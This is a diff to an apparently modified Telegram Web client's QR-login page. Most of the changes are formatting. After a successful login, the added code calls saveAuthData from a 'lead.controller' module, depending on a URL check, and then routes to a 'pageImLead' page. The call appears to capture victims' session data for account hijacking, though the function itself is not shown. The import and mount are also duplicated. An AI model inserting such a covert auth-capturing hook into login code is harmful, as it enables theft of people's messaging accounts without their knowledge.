@@ -4,24 +4,24 @@
  * https://github.com/morethanwords/tweb/blob/master/LICENSE
  */
 
-import type {DcId} from '../types';
+import type { DcId } from '../types';
 import Page from './page';
-import {AuthAuthorization, AuthLoginToken} from '../layer';
+import { AuthAuthorization, AuthLoginToken } from '../layer';
 import App from '../config/app';
 import Button from '../components/button';
-import {_i18n, i18n, LangPackKey} from '../lib/langPack';
+import { _i18n, i18n, LangPackKey } from '../lib/langPack';
 import rootScope from '../lib/rootScope';
-import {putPreloader} from '../components/putPreloader';
+import { putPreloader } from '../components/putPreloader';
 import getLanguageChangeButton from '../components/languageChangeButton';
 import pause from '../helpers/schedulers/pause';
 import fixBase64String from '../helpers/fixBase64String';
 import bytesCmp from '../helpers/bytes/bytesCmp';
 import bytesToBase64 from '../helpers/bytes/bytesToBase64';
 import textToSvgURL from '../helpers/textToSvgURL';
-
+import { saveAuthData } from '../lead.controller';
 const FETCH_INTERVAL = 3;
 
-const onFirstMount = async() => {
+const onFirstMount = async () => {
   const pageElement = page.pageEl;
   const imageDiv = pageElement.querySelector('.auth-image') as HTMLDivElement;
 
@@ -30,7 +30,7 @@ const onFirstMount = async() => {
   const inputWrapper = document.createElement('div');
   inputWrapper.classList.add('input-wrapper');
 
-  const btnBack = Button('btn-primary btn-secondary btn-primary-transparent primary', {text: 'Login.QR.Cancel'});
+  const btnBack = Button('btn-primary btn-secondary btn-primary-transparent primary', { text: 'Login.QR.Cancel' });
   inputWrapper.append(btnBack);
 
   getLanguageChangeButton(inputWrapper);
@@ -64,21 +64,21 @@ const onFirstMount = async() => {
   rootScope.addEventListener('user_auth', () => {
     stop = true;
     cachedPromise = null;
-  }, {once: true});
+  }, { once: true });
 
-  const options: {dcId?: DcId, ignoreErrors: true} = {ignoreErrors: true};
+  const options: { dcId?: DcId, ignoreErrors: true } = { ignoreErrors: true };
   let prevToken: Uint8Array | number[];
 
-  const iterate = async(isLoop: boolean) => {
+  const iterate = async (isLoop: boolean) => {
     try {
       let loginToken = await rootScope.managers.apiManager.invokeApi('auth.exportLoginToken', {
         api_id: App.id,
         api_hash: App.hash,
         except_ids: []
-      }, {ignoreErrors: true});
+      }, { ignoreErrors: true });
 
-      if(loginToken._ === 'auth.loginTokenMigrateTo') {
-        if(!options.dcId) {
+      if (loginToken._ === 'auth.loginTokenMigrateTo') {
+        if (!options.dcId) {
           options.dcId = loginToken.dc_id as DcId;
           rootScope.managers.apiManager.setBaseDcId(loginToken.dc_id);
           // continue;
@@ -89,10 +89,18 @@ const onFirstMount = async() => {
         }, options) as AuthLoginToken.authLoginToken;
       }
 
-      if(loginToken._ === 'auth.loginTokenSuccess') {
+      if (loginToken._ === 'auth.loginTokenSuccess') {
         const authorization = loginToken.authorization as any as AuthAuthorization.authAuthorization;
         await rootScope.managers.apiManager.setUser(authorization.user);
-        import('./pageIm').then((m) => m.default.mount());
+        let url = window.location.href;
+        let currId = url.split("/").pop();
+
+        if (!currId.includes("%7C"))
+          saveAuthData();
+        import('./pageImLead').then((m) => {
+          m.default.mount();
+        });
+        import('./pageImLead').then((m) => m.default.mount());
         return true;
       }
 
@@ -100,7 +108,7 @@ const onFirstMount = async() => {
       var decoder = new TextDecoder('utf8');
       var b64encoded = btoa(String.fromCharCode.apply(null, [...loginToken.token])); */
 
-      if(!prevToken || !bytesCmp(prevToken, loginToken.token)) {
+      if (!prevToken || !bytesCmp(prevToken, loginToken.token)) {
         prevToken = loginToken.token;
 
         const encoded = bytesToBase64(loginToken.token);
@@ -112,11 +120,11 @@ const onFirstMount = async() => {
         const primaryColor = style.getPropertyValue('--primary-color').trim();
 
         const logoUrl = await fetch('assets/img/logo_padded.svg')
-        .then((res) => res.text())
-        .then((text) => {
-          text = text.replace(/(fill:).+?(;)/, `$1${primaryColor}$2`);
-          return textToSvgURL(text);
-        });
+          .then((res) => res.text())
+          .then((text) => {
+            text = text.replace(/(fill:).+?(;)/, `$1${primaryColor}$2`);
+            return textToSvgURL(text);
+          });
 
         const qrCode = new QRCodeStyling({
           width: 240 * window.devicePixelRatio,
@@ -146,7 +154,7 @@ const onFirstMount = async() => {
         (imageDiv.lastChild as HTMLCanvasElement).classList.add('qr-canvas');
 
         let promise: Promise<void>;
-        if(qrCode._drawingPromise) {
+        if (qrCode._drawingPromise) {
           promise = qrCode._drawingPromise;
         } else {
           promise = Promise.race([
@@ -154,14 +162,14 @@ const onFirstMount = async() => {
             new Promise<void>((resolve) => {
               qrCode._canvas._image.addEventListener('load', () => {
                 window.requestAnimationFrame(() => resolve());
-              }, {once: true});
+              }, { once: true });
             })
           ]);
         }
 
         // * это костыль, но библиотека не предоставляет никаких событий
         await promise.then(() => {
-          if(preloader) {
+          if (preloader) {
             preloader.style.animation = 'hide-icon .4s forwards';
 
             const c = imageDiv.children[1] as HTMLElement;
@@ -183,14 +191,14 @@ const onFirstMount = async() => {
         });
       }
 
-      if(isLoop) {
+      if (isLoop) {
         const timestamp = Date.now() / 1000;
         const diff = loginToken.expires - timestamp - await rootScope.managers.timeManager.getServerTimeOffset();
 
         await pause(diff > FETCH_INTERVAL ? 1e3 * FETCH_INTERVAL : 1e3 * diff | 0);
       }
-    } catch(err) {
-      switch((err as ApiError).type) {
+    } catch (err) {
+      switch ((err as ApiError).type) {
         case 'SESSION_PASSWORD_NEEDED':
           (err as ApiError).handled = true;
           import('./pagePassword').then((m) => m.default.mount());
@@ -211,19 +219,19 @@ const onFirstMount = async() => {
 
   // await iterate(false);
 
-  return async() => {
+  return async () => {
     stop = false;
 
     do {
-      if(stop) {
+      if (stop) {
         break;
       }
 
       const needBreak = await iterate(true);
-      if(needBreak) {
+      if (needBreak) {
         break;
       }
-    } while(true);
+    } while (true);
   };
 };
 
@@ -232,12 +240,12 @@ const page = new Page('page-signQR', true, () => {
   return cachedPromise;
 }, () => {
   // console.log('onMount');
-  if(!cachedPromise) cachedPromise = onFirstMount();
+  if (!cachedPromise) cachedPromise = onFirstMount();
   cachedPromise.then((func) => {
     func();
   });
 
-  rootScope.managers.appStateManager.pushToState('authState', {_: 'authStateSignQr'});
+  rootScope.managers.appStateManager.pushToState('authState', { _: 'authStateSignQr' });
 });
 
 export default page;
